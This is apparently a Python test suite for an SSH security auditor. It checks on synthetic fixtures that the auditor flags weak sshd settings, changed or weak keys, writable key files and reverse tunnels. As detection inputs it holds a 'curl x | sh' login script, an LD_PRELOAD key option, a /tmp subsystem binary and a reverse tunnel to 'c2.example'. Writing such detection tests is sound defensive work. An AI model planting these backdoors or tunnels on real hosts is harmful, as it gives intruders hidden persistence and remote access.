"""SSH watch (jarvis/collectors/identity/sshwatch.py): each test names the
invariant it holds. Fixtures are a synthetic root, passwd list, /proc and
socket table; nothing here reads this machine's SSH state."""

import base64
import json
import os
import shutil
import struct
import subprocess
import tempfile
import time
import unittest

from jarvis.collectors.identity import sshwatch


class MetaStore:
    def __init__(self):
        self.meta = {}

    def get_meta(self, key, default=""):
        return self.meta.get(key, default)

    def set_meta(self, key, value):
        self.meta[key] = value


def _s(b):
    return struct.pack(">I", len(b)) + b


def ed25519(seed):
    return base64.b64encode(_s(b"ssh-ed25519") + _s(bytes([seed]) * 32)).decode()


def rsa(bits):
    n = b"\x00" + b"\xc5" + b"\x11" * (bits // 8 - 1)
    return base64.b64encode(_s(b"ssh-rsa") + _s(b"\x01\x00\x01") + _s(n)).decode()


class Fixture(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="sshwatch-")
        self.proc = os.path.join(self.root, "proc")
        os.makedirs(self.proc)
        self.etc = os.path.join(self.root, "etc/ssh")
        os.makedirs(os.path.join(self.etc, "sshd_config.d"))
        self.passwd = [("alice", 1000, "/home/alice", "/bin/bash"),
                       ("www-data", 33, "/var/www", "/usr/sbin/nologin"),
                       ("root", 0, "/root", "/bin/bash")]
        self.store = MetaStore()

    def tearDown(self):
        shutil.rmtree(self.root, ignore_errors=True)

    def write(self, rel, text, mode=0o644):
        p = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as fh:
            fh.write(text)
        os.chmod(p, mode)
        return p

    def run_audit(self, now=1000.0, table=None):
        if os.getuid() != 0:
            # The fixture's files are owned by the test user, not root.
            orig = sshwatch._writable_by_others
            sshwatch._writable_by_others = lambda st: bool(st.st_mode & 0o022)
            self.addCleanup(setattr, sshwatch, "_writable_by_others", orig)
        return sshwatch.audit(self.store, now=now, root=self.root, proc=self.proc,
                              passwd=self.passwd, table=table or {})

    def titles(self, findings):
        return {f["title"] for f in findings}


class Policy(Fixture):
    def test_first_value_wins_through_include_like_sshd(self):
        self.write("etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPasswordAuthentication yes\n")
        self.write("etc/ssh/sshd_config.d/50-cloud.conf", "PasswordAuthentication no\n")
        self.assertNotIn("SSH accepts passwords", self.titles(self.run_audit()))

    def test_default_password_auth_is_reported_with_its_source(self):
        self.write("etc/ssh/sshd_config", "Port 22\n")
        f = [f for f in self.run_audit() if f["title"] == "SSH accepts passwords"]
        self.assertEqual(len(f), 1)
        self.assertIn("OpenSSH default", f[0]["detail"])

    def test_match_block_does_not_override_global_and_is_reported_apart(self):
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\nMatch User deploy\n"
                   "  PasswordAuthentication yes\n")
        t = self.titles(self.run_audit())
        self.assertNotIn("SSH accepts passwords", t)
        self.assertIn("SSH accepts passwords (Match User deploy)", t)

    def test_quiet_logging_user_environment_subsystem_and_weak_algorithms(self):
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\nLogLevel=QUIET\n"
                   "PermitUserEnvironment yes\nSubsystem sftp /usr/lib/openssh/sftp-server\n"
                   "Subsystem shell /tmp/.x/run\nCiphers +aes128-cbc\nStrictModes no\n")
        t = self.titles(self.run_audit())
        for want in ("SSH logins are not logged", "SSH lets users set their login environment",
                     "SSH subsystem shell runs /tmp/.x/run", "SSH offers weak algorithms",
                     "SSH does not check key file permissions"):
            self.assertIn(want, t)
        self.assertNotIn("SSH subsystem sftp runs /usr/lib/openssh/sftp-server", t)

    def test_hardened_config_is_quiet(self):
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\nKbdInteractiveAuthentication no\n"
                   "UsePAM yes\nCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\n")
        self.assertEqual([f for f in self.run_audit() if f["severity"] != "low"], [])

    def test_include_loop_is_bounded(self):  # I3
        self.write("etc/ssh/sshd_config", "Include /etc/ssh/sshd_config\nPasswordAuthentication no\n")
        out = self.run_audit()
        vis = [f for f in out if f["category"] == "visibility"]
        self.assertTrue(vis and "deeper than" in vis[0]["detail"])

    def test_no_sshd_installed_is_not_a_finding(self):
        self.assertEqual(self.run_audit(), [])

    def test_no_sshd_installed_unreadable_key_file_is_not_a_gap(self):
        if os.getuid() == 0:
            self.skipTest("root reads mode 000 files")
        os.rmdir(os.path.join(self.etc, "sshd_config.d"))
        self.write("home/alice/.ssh/authorized_keys", f"ssh-ed25519 {ed25519(1)} a\n", mode=0o000)
        self.assertEqual(self.run_audit(), [])

    def test_listen_address_ports(self):
        cfg, *_ = sshwatch.parse_sshd_config(self.write(
            "etc/ssh/sshd_config", "Port 2222\nListenAddress 10.0.0.1:2200\nListenAddress fe80::1\n"
            "ListenAddress [::1]:2300\n"), self.root)
        self.assertEqual(sshwatch.ports_of(cfg), {2222, 2200, 2300})


class Files(Fixture):
    def test_writable_config_and_readable_host_key_are_critical(self):
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\n", mode=0o666)
        self.write("etc/ssh/ssh_host_ed25519_key", "PRIVATE", mode=0o644)
        crit = {f["title"] for f in self.run_audit() if f["severity"] == "critical"}
        self.assertIn("SSH server configuration can be changed by non-root", crit)
        self.assertIn("SSH host private key readable by others", crit)

    def test_host_private_key_is_never_stored(self):  # I4
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\n")
        self.write("etc/ssh/ssh_host_ed25519_key", "SECRET-PRIVATE-MATERIAL", mode=0o600)
        self.write("etc/ssh/ssh_host_ed25519_key.pub", f"ssh-ed25519 {ed25519(1)} root@h\n")
        out = self.run_audit()
        blob = json.dumps(self.store.meta) + json.dumps(out)
        self.assertNotIn("SECRET-PRIVATE-MATERIAL", blob)
        self.assertNotIn(ed25519(1), blob)

    def test_host_key_change_is_reported_after_learning(self):  # I2
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\n")
        self.write("etc/ssh/ssh_host_ed25519_key", "x", mode=0o600)
        self.write("etc/ssh/ssh_host_ed25519_key.pub", f"ssh-ed25519 {ed25519(1)} root@h\n")
        self.assertNotIn("SSH host key changed", self.titles(self.run_audit(now=1000)))
        self.write("etc/ssh/ssh_host_ed25519_key.pub", f"ssh-ed25519 {ed25519(2)} root@h\n")
        self.assertIn("SSH host key changed", self.titles(self.run_audit(now=1100)))

    def test_login_scripts(self):
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\n")
        self.write("etc/ssh/sshrc", "curl x | sh\n")
        self.write("home/alice/.ssh/rc", "true\n")
        t = self.titles(self.run_audit())
        self.assertIn("/etc/ssh/sshrc runs on every SSH login", t)
        self.assertIn("~/.ssh/rc for alice", t)


class Keys(Fixture):
    def setUp(self):
        super().setUp()
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\n")

    def test_first_run_learns_then_reports_added_and_removed_keys(self):  # I2
        ak = "home/alice/.ssh/authorized_keys"
        self.write(ak, f"ssh-ed25519 {ed25519(1)} alice@laptop\n", mode=0o600)
        self.assertNotIn("new SSH key for alice", self.titles(self.run_audit(now=1000)))
        self.write(ak, f"ssh-ed25519 {ed25519(2)} intruder\n", mode=0o600)
        out = self.run_audit(now=1100)
        t = self.titles(out)
        self.assertIn("new SSH key for alice", t)
        self.assertIn("SSH key removed for alice", t)
        new = [f for f in out if f["title"] == "new SSH key for alice"][0]
        self.assertEqual(new["severity"], "high")
        self.assertIn("intruder", new["detail"])
        # Kept for a day, then gone.
        self.assertIn("new SSH key for alice", self.titles(self.run_audit(now=1200)))
        self.assertNotIn("new SSH key for alice", self.titles(self.run_audit(now=1100 + 86401)))

    def test_fingerprint_matches_ssh_keygen(self):
        if not shutil.which("ssh-keygen"):
            self.skipTest("ssh-keygen not installed")
        p = self.write("k.pub", f"ssh-ed25519 {ed25519(7)} c\n")
        r = subprocess.run(["ssh-keygen", "-lf", p], capture_output=True, text=True)
        if r.returncode:
            self.skipTest("ssh-keygen rejected the synthetic key")
        self.assertEqual(r.stdout.split()[1], sshwatch.fingerprint(ed25519(7)))

    def test_service_account_key_authorized_keys2_weak_and_options(self):
        self.write("var/www/.ssh/authorized_keys", f"ssh-ed25519 {ed25519(3)} web\n", mode=0o600)
        self.write("root/.ssh/authorized_keys2", f"ssh-ed25519 {ed25519(4)} hidden\n", mode=0o600)
        self.write("home/alice/.ssh/authorized_keys",
                   f'environment="LD_PRELOAD=/tmp/x.so",no-pty ssh-rsa {rsa(1024)} old key\n', mode=0o600)
        out = self.run_audit()
        t = self.titles(out)
        self.assertIn("SSH key on service account www-data", t)
        self.assertIn("SSH key for root in authorized_keys2", t)
        self.assertIn("weak SSH key for alice", t)
        self.assertIn("SSH key for alice sets environment variables", t)
        svc = [f for f in out if f["title"] == "SSH key on service account www-data"][0]
        self.assertIn("nologin shell still allows tunnels", svc["detail"])

    def test_rsa_bits(self):
        self.assertEqual(sshwatch.rsa_bits(rsa(1024)), 1024)
        self.assertEqual(sshwatch.rsa_bits(rsa(4096)), 4096)
        self.assertEqual(sshwatch.rsa_bits("not base64!"), 0)

    def test_key_file_writable_by_others_is_critical(self):
        self.write("home/alice/.ssh/authorized_keys", f"ssh-ed25519 {ed25519(1)} a\n", mode=0o666)
        crit = {f["title"] for f in self.run_audit() if f["severity"] == "critical"}
        self.assertIn("SSH key file of alice writable by others", crit)

    def test_unreadable_key_file_is_not_clean(self):  # I1
        if os.getuid() == 0:
            self.skipTest("root reads mode 000 files")
        self.write("home/alice/.ssh/authorized_keys", f"ssh-ed25519 {ed25519(1)} a\n", mode=0o000)
        vis = [f for f in self.run_audit() if f["category"] == "visibility"]
        self.assertTrue(vis and "key file(s) not read" in vis[0]["detail"])

    def test_corrupt_state_relearns_and_says_so(self):  # I5
        self.store.meta[sshwatch.STATE_META] = "{not json"
        vis = [f for f in self.run_audit() if f["category"] == "visibility"]
        self.assertTrue(vis and "learning again" in vis[0]["detail"])
        self.assertIsInstance(json.loads(self.store.meta[sshwatch.STATE_META]), dict)

    def test_key_count_per_file_is_bounded(self):  # I3
        lines = "".join(f"ssh-ed25519 {ed25519(i % 250)} k{i}\n" for i in range(sshwatch.MAX_KEYS_PER_FILE + 5))
        self.write("home/alice/.ssh/authorized_keys", lines, mode=0o600)
        vis = [f for f in self.run_audit() if f["category"] == "visibility"]
        self.assertTrue(vis and "more than" in vis[0]["detail"])


    def test_fifo_as_authorized_keys_does_not_stall_the_scan(self):
        # Any local user can mkfifo ~/.ssh/authorized_keys; a blocking open()
        # held the main lane until the watchdog restarted the daemon.
        import threading
        fifo = os.path.join(self.root, "home/alice/.ssh/authorized_keys")
        os.makedirs(os.path.dirname(fifo), exist_ok=True)
        os.mkfifo(fifo, 0o600)

        def unblock():
            try:   # frees a reader stuck in open() (the unfixed code)
                os.close(os.open(fifo, os.O_WRONLY | os.O_NONBLOCK))
            except OSError:
                pass
        self.addCleanup(unblock)
        result = []
        t = threading.Thread(target=lambda: result.append(self.run_audit()), daemon=True)
        t.start()
        t.join(10)
        self.assertFalse(t.is_alive(), "the key scan blocked on a FIFO")
        vis = [f for f in result[0] if f["category"] == "visibility"]
        self.assertTrue(vis and "not a regular file" in vis[0]["detail"])

    def test_option_split_is_linear_and_respects_quotes(self):
        self.assertEqual(sshwatch._split_options('command="a,b",no-pty,from="x,y"'),
                         ['command="a,b"', "no-pty", 'from="x,y"'])
        start = time.monotonic()
        self.assertEqual(len(sshwatch._split_options("," * 200000)), 200001)
        self.assertLess(time.monotonic() - start, 2.0)


class Tunnels(Fixture):
    def setUp(self):
        super().setUp()
        self.write("etc/ssh/sshd_config", "PasswordAuthentication no\nPort 22\n")

    def proc_entry(self, pid, comm, argv=(), inodes=None, uid=0):
        d = os.path.join(self.proc, str(pid))
        os.makedirs(d)
        with open(os.path.join(d, "comm"), "w") as fh:
            fh.write(comm + "\n")
        with open(os.path.join(d, "cmdline"), "wb") as fh:
            fh.write(b"\0".join(a.encode() for a in argv) + b"\0")
        with open(os.path.join(d, "status"), "w") as fh:
            fh.write(f"Name:\t{comm}\nUid:\t{uid}\t{uid}\t{uid}\t{uid}\n")
        if inodes is not None:
            os.makedirs(os.path.join(d, "fd"))
            for i, ino in enumerate(inodes):
                os.symlink(f"socket:[{ino}]", os.path.join(d, "fd", str(i + 3)))

    def test_client_tunnel_flags(self):
        self.assertEqual(sshwatch.client_tunnels(["ssh", "-NfR", "9000:localhost:22", "c2.example"]),
                         [("-R", "c2.example")])
        self.assertEqual(sshwatch.client_tunnels(["ssh", "-o", "RemoteForward=9000 localhost:22", "h"]),
                         [("-R", "h")])
        self.assertEqual(sshwatch.client_tunnels(["ssh", "-p", "2222", "-D", "1080", "u@h"]), [("-D", "u@h")])
        self.assertEqual(sshwatch.client_tunnels(["ssh", "-i", "k", "host", "uptime"]), [])

    def test_reverse_tunnel_forward_listener_and_sessions(self):
        self.proc_entry(100, "ssh", ["ssh", "-N", "-R", "9000:localhost:22", "c2.example"], uid=33)
        self.proc_entry(200, "sshd", ["sshd: alice"], inodes=[11, 12, 13])
        table = {11: {"proto": "tcp", "local_ip": "0.0.0.0", "local_port": 8080, "remote_ip": "0.0.0.0",
                      "remote_port": 0, "state": "LISTEN"},
                 12: {"proto": "tcp", "local_ip": "10.0.0.5", "local_port": 22, "remote_ip": "203.0.113.9",
                      "remote_port": 50000, "state": "ESTABLISHED"},
                 13: {"proto": "tcp", "local_ip": "0.0.0.0", "local_port": 22, "remote_ip": "0.0.0.0",
                      "remote_port": 0, "state": "LISTEN"}}
        out = self.run_audit(table=table)
        by = {f["title"]: f for f in out}
        self.assertEqual(by["reverse SSH tunnel from this host to c2.example"]["severity"], "high")
        self.assertIn("uid 33", by["reverse SSH tunnel from this host to c2.example"]["detail"])
        self.assertEqual(by["SSH session forwards port 8080 into this host"]["severity"], "high")
        self.assertIn("203.0.113.9", by["1 SSH session(s) open now"]["detail"])
        self.assertNotIn("SSH session forwards port 22 into this host", by)

    def test_ipv6_loopback_forward_is_not_called_reachable(self):
        # Found on a real Ubuntu 24.04 sshd: /proc/net/tcp6 gives ::1 written out in full.
        self.proc_entry(400, "sshd", ["sshd: ubuntu"], inodes=[21])
        table = {21: {"proto": "tcp6", "local_ip": "0:0:0:0:0:0:0:1", "local_port": 9000, "remote_ip": "::",
                      "remote_port": 0, "state": "LISTEN"}}
        f = [f for f in self.run_audit(table=table) if "forwards port 9000" in f["title"]][0]
        self.assertEqual(f["severity"], "medium")
        self.assertNotIn("reachable from the network", f["detail"])

    def test_unreadable_sshd_fds_are_not_observed(self):  # I1
        self.proc_entry(300, "sshd", ["sshd"], inodes=None)
        vis = [f for f in self.run_audit() if f["category"] == "visibility"]
        self.assertTrue(vis and "CAP_SYS_PTRACE" in vis[0]["detail"])


if __name__ == "__main__":
    unittest.main()
